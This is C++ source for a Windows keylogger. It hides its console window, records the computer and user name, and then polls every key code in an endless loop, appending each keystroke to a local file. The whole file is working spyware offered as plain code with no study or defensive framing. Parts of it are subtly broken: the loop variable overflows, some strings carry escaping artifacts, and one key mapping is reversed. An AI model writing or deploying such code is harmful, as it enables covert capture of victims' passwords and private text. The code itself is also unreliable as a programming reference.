#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <ctime>

// Log file
const char* LOG_FILE = "key_log.txt";

// Function to get current date and time
std::string getCurrentTime() {
    time_t now = time(0);
    char* dt = ctime(&now);
    return dt;
}

// Function to log system information
void logSystemInfo() {
    std::ofstream logfile;
    logfile.open(LOG_FILE, std::ios::app);

    logfile << "\n\n--- Keylogger Started ---\\n";
    logfile << "Timestamp: " << getCurrentTime();

    char buffer[256];
    DWORD size = sizeof(buffer);

    // Get and log computer name
    if (GetComputerNameA(buffer, &size)) {
        logfile << "Computer Name: " << buffer << "\\n";
    }

    // Get and log user name
    size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) {
        logfile << "User Name: " << buffer << "\\n";
    }

    logfile << "--------------------------\\n\n";
    logfile.close();
}


// Function to save the logged key
void SaveKey(const std::string& key) {
    std::ofstream logfile;
    logfile.open(LOG_FILE, std::ios::app);
    logfile << key;
    logfile.close();
}

// Function to translate virtual key code to string
std::string TranslateKey(int key) {
    // Handle Shift key state for capitalization and symbols
    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    switch (key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "\n";
        case VK_TAB: return "[TAB]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_DELETE: return "[DELETE]";
        case VK_LBUTTON: return "[LMB]";
        case VK_RBUTTON: return "[RMB]";
        case VK_MBUTTON: return "[MMB]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT: return ""; // Don't log shift key presses themselves
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: return "[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU: return "[ALT]";
        case VK_CAPITAL: return ""; // Don't log caps lock presses
        case VK_ESCAPE: return "[ESC]";
        case VK_PRIOR: return "[PAGE_UP]";
        case VK_NEXT: return "[PAGE_DOWN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT_ARROW]";
        case VK_UP: return "[UP_ARROW]";
        case VK_RIGHT: return "[RIGHT_ARROW]";
        case VK_DOWN: return "[DOWN_ARROW]";
        case VK_SELECT: return "[SELECT]";
        case VK_PRINT: return "[PRINT]";
        case VK_EXECUTE: return "[EXECUTE]";
        case VK_SNAPSHOT: return "[PRINT_SCREEN]";
        case VK_INSERT: return "[INSERT]";
        case VK_HELP: return "[HELP]";
        case VK_SLEEP: return "[SLEEP]";
        case VK_NUMPAD0: return "0";
        case VK_NUMPAD1: return "1";
        case VK_NUMPAD2: return "2";
        case VK_NUMPAD3: return "3";
        case VK_NUMPAD4: return "4";
        case VK_NUMPAD5: return "5";
        case VK_NUMPAD6: return "6";
        case VK_NUMPAD7: return "7";
        case VK_NUMPAD8: return "8";
        case VK_NUMPAD9: return "9";
        case VK_MULTIPLY: return "*";
        case VK_ADD: return "+";
        case VK_SEPARATOR: return ",";
        case VK_SUBTRACT: return "-";
        case VK_DECIMAL: return ".";
        case VK_DIVIDE: return "/";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        
        // Handle OEM keys (special characters)
        case VK_OEM_1: return shift ? ":" : ";";
        case VK_OEM_PLUS: return shift ? "+" : "=";
        case VK_OEM_COMMA: return shift ? "<" : ",";
        case VK_OEM_MINUS: return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2: return shift ? "?" : "/";
        case VK_OEM_3: return shift ? "`" : "~";
        case VK_OEM_4: return shift ? "{{" : "[";
        case VK_OEM_5: return shift ? "|" : "\\";
        case VK_OEM_6: return shift ? "}}" : "]";
        case VK_OEM_7: return shift ? "\"" : "'";

        default:
            // Handle printable characters
            if (key >= 'A' && key <= 'Z') {
                if ((caps && !shift) || (!caps && shift)) {
                    return std::string(1, (char)key);
                } else {
                    return std::string(1, (char)tolower(key));
                }
            }
            if (key >= '0' && key <= '9') {
                if (shift) {
                    switch (key) {
                        case '0': return ")";
                        case '1': return "!";
                        case '2': return "@";
                        case '3': return "#";
                        case '4': return "$";
                        case '5': return "%";
                        case '6': return "^";
                        case '7': return "&";
                        case '8': return "*";
                        case '9': return "(";
                    }
                } else {
                    return std::string(1, (char)key);
                }
            }
            // For unhandled keys, log the virtual key code for debugging
            return "[VK_CODE_" + std::to_string(key) + "]";
    }
}

int main() {
    // Hide console window
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    // Log system info at the start
    logSystemInfo();

    char i;
    while (true) {
        Sleep(10); // To prevent high CPU usage
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                std::string key = TranslateKey(i);
                if (!key.empty()) {
                    SaveKey(key);
                }
            }
        }
    }

    return 0;
}
